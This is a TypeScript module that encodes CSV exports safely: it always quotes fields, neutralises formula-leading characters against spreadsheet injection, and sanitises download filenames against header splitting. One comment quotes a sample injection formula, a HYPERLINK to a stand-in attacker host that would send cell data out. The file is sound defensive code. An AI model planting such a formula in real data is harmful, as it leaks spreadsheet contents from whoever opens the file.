/**
 * CSV encoding, for exports that land in a spreadsheet.
 *
 * Small enough to hand-roll, and worth hand-rolling for one reason: the obvious
 * implementation — join with commas, wrap anything containing a comma in quotes
 * — is wrong in two ways that both end badly.
 */

/**
 * Characters a spreadsheet treats as the start of a FORMULA rather than text.
 *
 * This is the part a naive encoder gets dangerously wrong. A cell beginning
 * `=`, `+`, `-` or `@` is evaluated by Excel, LibreOffice and Google Sheets when
 * the file is opened, and the value in it came from a stranger: anyone can put
 * `=HYPERLINK("http://attacker.example/?"&A1,"Click")` in the name field of a
 * signup form. Nothing is wrong with the CSV — the injection happens in the
 * program that opens it, on the machine of whoever downloads it, which here is
 * an administrator.
 *
 * The defence is a leading apostrophe, which every major spreadsheet reads as
 * "the rest of this cell is text". Tab and carriage return are included because
 * both are stripped on paste, which would expose the character behind them.
 *
 * See OWASP, "CSV Injection".
 */
const FORMULA_PREFIX = /^[=+\-@\t\r]/;

/** One field, quoted and escaped so it survives a round trip. */
function encodeField(value: unknown): string {
  // Quoted, not bare, so the "every field is quoted" rule below has no
  // exceptions — a single unquoted field is all it takes for the next person to
  // start reasoning about when quoting applies.
  if (value === null || value === undefined) return '""';

  let text: string;
  if (value instanceof Date) {
    // ISO 8601, in UTC. A locale-formatted date is ambiguous the moment the
    // file crosses a border — 03/04 is two different days on two continents.
    text = value.toISOString();
  } else if (typeof value === "boolean") {
    text = value ? "true" : "false";
  } else {
    text = String(value);
  }

  if (FORMULA_PREFIX.test(text)) text = `'${text}`;

  /*
   * Always quoted, rather than only when it contains a delimiter.
   *
   * Conditional quoting means the encoder has to be right about every
   * character that needs it — comma, quote, newline, carriage return, leading
   * and trailing whitespace — and being wrong about any one of them shifts
   * every subsequent column on that row. Quoting everything cannot be wrong,
   * and costs two bytes a field.
   */
  return `"${text.replaceAll('"', '""')}"`;
}

/**
 * Encode rows as CSV, with a header taken from the column list.
 *
 * CRLF line endings, per RFC 4180. Excel on Windows renders a bare LF as one
 * long line.
 */
export function toCsv<T>(
  columns: ReadonlyArray<{ header: string; value: (row: T) => unknown }>,
  rows: readonly T[],
): string {
  const lines = [columns.map((c) => encodeField(c.header)).join(",")];
  for (const row of rows) {
    lines.push(columns.map((c) => encodeField(c.value(row))).join(","));
  }
  return `${lines.join("\r\n")}\r\n`;
}

/**
 * A filename that is safe to put in a Content-Disposition header.
 *
 * Quotes and newlines in this header are a response-splitting vector, and the
 * value here includes a caller-influenced label, so it is reduced to a
 * conservative set rather than trusted.
 */
export function attachmentFilename(stem: string): string {
  const safe = stem.replace(/[^A-Za-z0-9._-]/g, "-").slice(0, 100);
  /*
   * "Non-empty" is not the test — "has something to read" is.
   *
   * A stem of "///" survives replacement as "---", which is truthy, so an
   * emptiness check passes it straight through and the browser offers to save
   * a file called "---.csv".
   */
  return /[A-Za-z0-9]/.test(safe) ? safe : "export";
}
